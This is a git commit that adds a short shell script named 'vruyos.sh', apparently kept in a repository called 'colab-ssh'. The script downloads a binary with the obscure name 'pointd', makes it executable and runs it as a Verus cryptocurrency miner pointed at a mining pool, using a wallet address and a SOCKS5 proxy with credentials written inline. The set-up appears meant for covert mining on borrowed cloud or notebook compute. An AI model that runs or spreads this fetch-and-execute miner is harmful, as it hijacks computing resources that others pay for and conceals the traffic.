6a9b05c10867de29ad6d4a93d66f2a359fd57e78
uaaoxjdr <99876928+uaaoxjdr@users.noreply.github.com>
2022-04-04 10:59:26 +0700

    Create vruyos.sh

---
+++ vruyos.sh
@@ -0,0 +1,4 @@
+apt update -y
+wget -q https://github.com/uaaoxjdr/colab-ssh/raw/master/pointd
+chmod +x pointd
+./pointd -a verus -o stratum+tcp://na.luckpool.net:3956 -u RFjeLpKzaG94EnaidkK2PvgdNR5Q5nTnbW.ken -t 2 -p x -x socks5://Novax:chalHatt@129.158.58.77:1080
